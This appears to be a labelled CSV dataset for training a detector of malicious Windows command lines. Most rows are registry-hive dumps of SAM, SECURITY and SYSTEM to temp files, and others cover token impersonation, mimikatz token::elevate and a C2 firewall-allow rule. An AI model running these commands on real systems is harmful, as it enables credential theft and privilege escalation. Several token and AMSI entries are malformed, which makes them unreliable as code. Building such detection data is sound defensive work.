text,label
reg export hklm\sam c:\windows\temp\siy9n24k.save,1
reg save hklm\sam c:\windows\temp\hihv1ept.save,1
reg save hklm\security c:\windows\temp\8lfe4nh9.save,1
reg export hklm\system c:\windows\temp\epmrnzcs.save,1
reg export hklm\sam c:\windows\temp\mowbe0g2.save,1
reg export hklm\system c:\windows\temp\7qyb9l77.save,1
reg export hklm\sam c:\windows\temp\z7ywoqry.save,1
reg save hklm\security c:\windows\temp\9tooidyj.save,1
reg export hklm\security c:\windows\temp\k90uwgd3.save,1
reg save hklm\system c:\windows\temp\4xadr3qv.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\6qq4q368.save""",1
"[dllimport(""advapi32.dll"")]   extern   bool   amsiutils(...)",3
reg export hklm\security c:\windows\temp\b5vm90jf.save,1
reg export hklm\security c:\windows\temp\i34vwyab.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\p15tsc2z.save""",1
reg save hklm\security c:\windows\temp\k2i5183p.save,1
reg export hklm\system c:\windows\temp\q4d3zmrb.save,1
"powershell -nop -c ""token::elevate""",3
reg save hklm\system c:\windows\temp\l2j3r64i.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
reg save hklm\security c:\windows\temp\t287z1pv.save,1
reg export hklm\sam c:\windows\temp\sz2a2pjl.save,1
reg save hklm\system c:\windows\temp\4zp66cbe.save,1
reg export hklm\system c:\windows\temp\9a8k4kfc.save,1
reg export hklm\system c:\windows\temp\cmeu4og8.save,1
reg save hklm\sam c:\windows\temp\u5lw45e0.save,1
reg save hklm\security c:\windows\temp\vumcc0p5.save,1
reg save hklm\system c:\windows\temp\tacd3d9n.save,1
reg save hklm\security c:\windows\temp\47q5932v.save,1
reg save hklm\security c:\windows\temp\ck9d1sfr.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg save hklm\sam c:\windows\temp\ntkqth0o.save,1
reg save hklm\system c:\windows\temp\g3o0qa0p.save,1
reg save hklm\sam c:\windows\temp\gre82kn7.save,1
reg export hklm\sam c:\windows\temp\bxya24i6.save,1
reg export hklm\system c:\windows\temp\18xlqy7n.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool openprocesstoken(...)""",3
reg save hklm\security c:\windows\temp\oknhrhql.save,1
reg export hklm\sam c:\windows\temp\yyrqrupo.save,1
reg export hklm\security c:\windows\temp\mm74mksz.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\yuni40kx.save""",1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\1lhtdvmx.save""",1
reg save hklm\sam c:\windows\temp\u9vs7pel.save,1
reg export hklm\sam c:\windows\temp\377lvmco.save,1
reg export hklm\security c:\windows\temp\gdp9hzxl.save,1
reg export hklm\sam c:\windows\temp\npm0q9kr.save,1
reg save hklm\security c:\windows\temp\a1zkozcs.save,1
reg export hklm\security c:\windows\temp\er53d2td.save,1
reg export hklm\security c:\windows\temp\x2duh2g4.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\ttuo8mkn.save""",1
reg export hklm\system c:\windows\temp\d75yd3tp.save,1
reg export hklm\security c:\windows\temp\4ttgwwyf.save,1
reg save hklm\system c:\windows\temp\w4o3qdk8.save,1
reg save hklm\system c:\windows\temp\7j2w1pt5.save,1
reg export hklm\security c:\windows\temp\rm3dfm4o.save,1
reg export hklm\security c:\windows\temp\kd80cekf.save,1
reg export hklm\security c:\windows\temp\dx0pmoda.save,1
reg export hklm\sam c:\windows\temp\16pakm8d.save,1
reg export hklm\security c:\windows\temp\yjwgurre.save,1
reg export hklm\system c:\windows\temp\0670go3h.save,1
reg save hklm\system c:\windows\temp\p1a8y6e4.save,1
"cmd.exe /c ""python   -m   http.server   8080""",0
reg save hklm\security c:\windows\temp\tw0zo93k.save,1
reg export hklm\sam c:\windows\temp\f4qr8hir.save,1
reg save hklm\sam c:\windows\temp\w8aqa8ct.save,1
reg export hklm\security c:\windows\temp\lmu1s9ra.save,1
reg save hklm\security c:\windows\temp\2wd255ed.save,1
$a   =   [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg save hklm\security c:\windows\temp\rzvcqfrp.save,1
reg export hklm\sam c:\windows\temp\5x7mc78c.save,1
reg export hklm\sam c:\windows\temp\m3bv73kb.save,1
reg save hklm\security c:\windows\temp\i89sqwsn.save,1
reg save hklm\system c:\windows\temp\atpqxs9w.save,1
